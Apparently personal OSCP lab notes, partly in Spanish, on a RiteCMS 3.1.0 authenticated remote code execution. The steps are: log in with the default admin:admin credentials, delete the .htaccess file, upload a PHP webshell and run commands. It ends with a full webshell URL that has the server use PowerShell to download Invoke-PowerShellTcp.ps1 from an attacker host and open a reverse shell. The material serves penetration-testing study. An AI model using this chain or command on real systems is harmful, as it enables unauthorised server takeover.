
## DESCRIPTION

RiteCMS version 3.1.0 and below suffers from a remote code execution in admin panel. An authenticated attacker can upload a php file and bypass the .htacess configuration that deny execution of .php files in media and files directory by default.

CREDENCIALES POR DEFECTO (admin.php): ADMIN ADMIN

#### Mas informaci√≥n
* https://www.exploit-db.com/exploits/50616


## EXPLOITATION

Existen muchas opciones disponible

### OPTION 1: Delete the .htaccess file in the media and files directory through the files manager module and then upload the php file - RCE achieved

1. Encontramos el CMS:
![[Pasted image 20230419210201.png]]

2.  Hacemos login en `URL/cms/admin.php` con las credenciales por defecto `admin:admin`

3. Creamos una webshell en php.

4. Eliminamos el fichero .htaccess del directorio files o media 

5. Subimos la webshell

![[Pasted image 20230419210330.png]]

![[Pasted image 20230419210342.png]]

**!!NOTA IMPORTANTE!!** 
* Cuidado por si ha cambiado el enlace por defecto
Pero si le damos al enlace, nos da un Not Found:
![[Pasted image 20230419210420.png]]

6. Buscamos la web con nuestra reverse shell y ejecutamos comandos:

![[Pasted image 20230419210532.png]]
7. Podemos utilizar Invoke-Powershell para construir una reverse shell.

```
 http://192.168.169.249:8000/cms/media/shell.php?cmd=cmd%20/c%20powershell%20-c%20IEX%20(New-Object%20Net.Webclient).downloadstring(%27http://192.168.119.169:8000/Invoke-PowerShellTcp.ps1%27)%22
```
## MACHINES

* Hack The Box: 
* OSCP LABs: Relia (192.168.169.249)

